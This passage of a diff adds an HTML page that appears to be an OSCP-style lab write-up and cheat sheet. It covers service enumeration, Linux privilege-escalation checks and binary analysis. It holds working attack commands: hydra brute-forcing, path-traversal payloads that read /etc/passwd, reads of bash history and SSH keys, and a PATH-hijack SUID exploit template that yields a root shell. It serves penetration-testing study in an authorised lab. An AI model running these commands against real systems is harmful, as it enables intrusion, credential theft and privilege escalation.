+</pre></div>
+<p><code>nsExtendTable</code> gives you the commands the agent runs plus the admin's own description of them.
+Descriptions are written for an internal audience and routinely name accounts and policies.</p>
+<hr />
+<h3>Phase 3 — Per-service enumeration</h3>
+<p>For each service, in the order that historically pays fastest.</p>
+<h4>HTTP/HTTPS</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20<span class="w">          </span><span class="c1"># stock page? framework? redirect?</span>
+<span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>robots.txt<span class="w"> </span>sitemap.xml<span class="w"> </span>.git/<span class="w"> </span>.htaccess<span class="w"> </span>server-status<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n"</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
+<span class="k">done</span>
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$TARGET</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
+</pre></div>
+<ul>
+<li>Note the <strong>404 body size</strong> — it is your filter for everything after.</li>
+<li>Vhosts: <code>ffuf -u http://$TARGET/ -H "Host: FUZZ" -w &lt;subdomains&gt; -fr "&lt;default page text&gt;"</code>.</li>
+<li>Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.</li>
+</ul>
+<h4>FTP</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>ftp://<span class="nv">$TARGET</span>
+</pre></div>
+<p>Try the account name as the password. Check for key material, configs, and backups in the data
+directory — a shared <code>/srv/ftp</code> often leaks a <em>different</em> account's secrets.</p>
+<h4>SSH</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>-i<span class="w"> </span>key<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span>id<span class="w">      </span><span class="c1"># never point a key at a host without -o BatchMode</span>
+ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>key<span class="w">                             </span>#<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>comment<span class="w"> </span>first:<span class="w"> </span>it<span class="w"> </span>names<span class="w"> </span>the<span class="w"> </span>user
+</pre></div>
+<h4>SMB</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+</pre></div>
+<hr />
+<h3>Phase 4 — Foothold</h3>
+<p>Get a shell, then <strong>immediately</strong> stabilise and record identity:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
+</pre></div>
+<p>Do not start hunting for privesc before you know exactly which uid and groups you hold — the
+escalation path depends on it.</p>
+<hr />
+<h3>Phase 5 — Local enumeration (Linux)</h3>
+<p>Send one script over one connection and read one report:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+</pre></div>
+<p>Checklist, in the order that finds things:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>sudo rights</td>
+<td><code>sudo -n -l</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>SUID, excluding snap noise</td>
+<td><code>find / -perm -4000 -type f 2&gt;/dev/null \| grep -v '^/snap'</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Capabilities</td>
+<td><code>getcap -r / 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Cron</td>
+<td><code>cat /etc/crontab; ls -la /etc/cron.*</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>Writable service files</td>
+<td><code>find / -writable -type f -path '*/etc/*' 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>Listening sockets</td>
+<td><code>ss -tlnp</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>Home directories</td>
+<td><code>ls -la /home/*</code> — this box had the SUID helper in a user's home</td>
+</tr>
+<tr>
+<td>8</td>
+<td>History and keys</td>
+<td><code>ls -la ~/.ssh; cat ~/.bash_history</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>Kernel</td>
+<td><code>uname -a</code> — only if 1–8 are empty</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Password reuse</td>
+<td>the foothold password against <code>sudo -S</code> and other users</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Rule:</strong> a <em>custom</em> SUID binary beats every generic exploit. Read it before reaching for
+<code>linpeas</code> output tables.</p>
+<hr />
+<h3>Phase 6 — Binary analysis (when a SUID binary looks custom)</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>/path/binary<span class="w">                    </span><span class="c1"># not stripped? then function names survive</span>
+strings<span class="w"> </span>-a<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">   </span><span class="c1"># look for system, popen, exec*, and bare command names</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
+</pre></div>
+<p>What you are looking for, in priority order:</p>
+<ol>
+<li><code>system()</code> / <code>popen()</code> with a <strong>bare command name</strong> → <code>PATH</code> hijack (CWE-426)</li>
+<li><code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> that call → the shell will not drop privileges → full root</li>
+<li>A writable path used by root → symlink or overwrite attack</li>
+<li>A shell escape in a pager/editor it invokes</li>
+</ol>
+<p>If the binary is setuid <strong>and</strong> setgid, or lives in a user-writable directory, the box author is
+telling you this is the path.</p>
+<hr />
+<h3>Phase 7 — Post-exploitation and reporting</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/root/proof.txt<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/home/*/local.txt
+ip<span class="w"> </span>a<span class="p">;</span><span class="w"> </span>ip<span class="w"> </span>r<span class="w">          </span>#<span class="w"> </span>can<span class="w"> </span>this<span class="w"> </span>host<span class="w"> </span>pivot?<span class="w"> </span><span class="o">(</span>single<span class="w"> </span>NIC<span class="w"> </span>+<span class="w"> </span>default<span class="w"> </span><span class="nv">route</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>no<span class="o">)</span>
+</pre></div>
+<p>Record: exact flags, the <code>id</code> output as root, the mechanism in one paragraph, and every command
+with its output. Then clean up.</p>
+<h4>Cleanup checklist</h4>
+<ul>
+<li>Remove every file you created, then <strong>verify</strong> with <code>ls</code>.</li>
+<li>Revert any file you modified.</li>
+<li>Do not change credentials you do not own; if an exploit would have (this box's <code>chpasswd</code>),
+  note that it did not run.</li>
+<li>Note in the report what you changed and what you left alone.</li>
+</ul>
+<hr />
+<h3>Timeboxing heuristics</h3>
+<table>
+<thead>
+<tr>
+<th>Situation</th>
+<th>Budget</th>
+<th>Move on when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Web on a stock default page</td>
+<td>10 min</td>
+<td>Two wordlists + vhosts agree there is nothing</td>
+</tr>
+<tr>
+<td>Version-CVE rabbit hole</td>
+<td>5 min</td>
+<td>The package revision shows the backport</td>
+</tr>
+<tr>
+<td>Credential guessing</td>
+<td>5 min per service</td>
+<td>Account-specific defaults exhausted</td>
+</tr>
+<tr>
+<td>Generic privesc sweep</td>
+<td>15 min</td>
+<td>A custom SUID/service/cron finding exists</td>
+</tr>
+</tbody>
+</table>
+<p>The recurring lesson: <strong>spend the time on the surface you have not looked at, not on the one you
+have already disproved.</strong> On this box, thirty UDP ports were worth more than an hour of web.</p></div></section>
+<section class="chapter" id="ch-09" data-title="Cheat sheet"><div class="ch-head"><span class="ch-num">09</span><div class="ch-title"><h2>Cheat sheet</h2><p class="ch-sub">Every command, with the flag that matters</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Only commands I have actually needed, with the small flag that matters each time.</p>
+<hr />
+<h3>Scanning</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## full TCP, fast — always -p-</span>
+nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-T4<span class="w"> </span>-oN<span class="w"> </span>full_tcp.txt<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## versions + default scripts on the ports that matter</span>
+nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p21,22,80<span class="w"> </span>-oN<span class="w"> </span>services.txt<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## UDP: the phase everyone skips</span>
+nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## live hosts</span>
+nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $2}'</span>
+</pre></div>
+<hr />
+<h3>SNMP</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## find the community string</span>
+<span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"== </span><span class="nv">$c</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="k">done</span>
+
+<span class="c1">## full walk to a file, then grep it</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span>&gt;<span class="w"> </span>snmp_full.txt
+
+<span class="c1">## the three trees that matter on Linux</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2<span class="w">    </span><span class="c1"># nsExtendTable (commands + descriptions)</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w">    </span><span class="c1"># process names</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w">    </span><span class="c1"># installed packages</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">      </span><span class="c1"># interface IPs</span>
+
+<span class="c1">## decode an nsExtendTable index suffix (5.82.69.83.69.84 -&gt; RESET)</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"s='82.69.83.69.84'.split('.'); print(''.join(chr(int(x)) for x in s[1:]))"</span>
+
+<span class="c1">## bulk walk when v1 is slow</span>
+snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
+</pre></div>
+<hr />
+<h3>Web</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}\n"</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
+
+<span class="c1">## path traversal tests — --path-as-is is mandatory or curl normalises the payload</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"</span>
+
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
+
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Host: FUZZ"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">"Apache2 Ubuntu Default Page"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
+</pre></div>
+<hr />
+<h3>FTP</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
+
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>-V<span class="w"> </span>ftp://<span class="nv">$T</span><span class="w">       </span><span class="c1"># -t 4 keeps vsftpd happy</span>
+
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/"</span><span class="w">                         </span><span class="c1"># list</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/file"</span><span class="w">             </span>#<span class="w"> </span>download
+</pre></div>
+<hr />
+<h3>SSH</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>id_rsa<span class="w">                                  </span><span class="c1"># comment names the user</span>
+
+<span class="c1">## BatchMode=yes so it never hangs on a password prompt</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
+
+sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span><span class="nv">PubkeyAuthentication</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
+
+<span class="c1">## run a whole enumeration script in one connection</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+</pre></div>
+<hr />
+<h3>SMB</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'recurse; ls'</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'get file.txt'</span>
+</pre></div>
+<hr />
+<h3>Linux local enumeration</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
+
+<span class="c1">## SUID without tripling the output on snap</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span>
+
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span><span class="w">    </span><span class="c1"># setgid</span>
+getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
+ss<span class="w"> </span>-tlnp
+ls<span class="w"> </span>-la<span class="w"> </span>/home/*<span class="w"> </span>/opt<span class="w"> </span>/srv<span class="w"> </span>/var/www
+find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span>local.txt<span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span>proof.txt<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</pre></div>
+<hr />
+<h3>Binary analysis</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># "not stripped" = function names survive</span>
+strings<span class="w"> </span>-a<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">                 </span><span class="c1"># system / popen / exec / bare command names</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
+objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </span>.rodata<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w">          </span>#<span class="w"> </span>resolve<span class="w"> </span>the<span class="w"> </span>strings<span class="w"> </span>passed<span class="w"> </span>to<span class="w"> </span>system<span class="o">()</span>
+</pre></div>
+<p>Reconstructing source from a small binary:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">+ setuid / setgid  →  setuid(0); setgid(0);
++ lea rdi,[rip+...] →  the argument is a fixed string
++ call system@plt  →  system("...")</span></pre></div>
+<hr />
+<h3>Privesc — PATH hijack template</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/x.XXXXXX<span class="k">)</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">id &gt; /tmp/root_id.txt</span>
+<span class="s">cat /root/proof.txt &gt; /tmp/root_proof.txt 2&gt;&amp;1</span>
+<span class="s">chmod 644 /tmp/root_id.txt /tmp/root_proof.txt</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+
+<span class="c1">## name the faked binary exactly as the SUID program invokes it</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+
+cat<span class="w"> </span>/tmp/root_id.txt
+</pre></div>
+<p>Works only when the SUID binary calls <code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> <code>system()</code>. If it does
+not, the shell drops privileges and the payload runs as you. Check the disassembly order first.</p>
+<p>Interactive variant:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\n/bin/bash -p\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+</pre></div>
+<hr />
+<h3>Cleanup</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/c.XXXXXX<span class="k">)</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">"No such file or directory"</span>
+</pre></div></div></section>
+
+    <footer>
+      <span>Authorised lab environment · flags and credentials are lab-specific</span>
+      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 24 November 2026</span>
+    </footer>
+  </main>
+</div>
+
+<button id="toTop" type="button" aria-label="Back to top">↑</button>
+<div id="toast" role="status" aria-live="polite"></div>
+<script>
+(function(){
+  "use strict";
+  var root=document.documentElement;
+
+  /* ---------- theme ---------- */
+  var THEME_KEY="oscp-theme";
+  function setTheme(t){root.setAttribute("data-theme",t);try{localStorage.setItem(THEME_KEY,t)}catch(e){}}
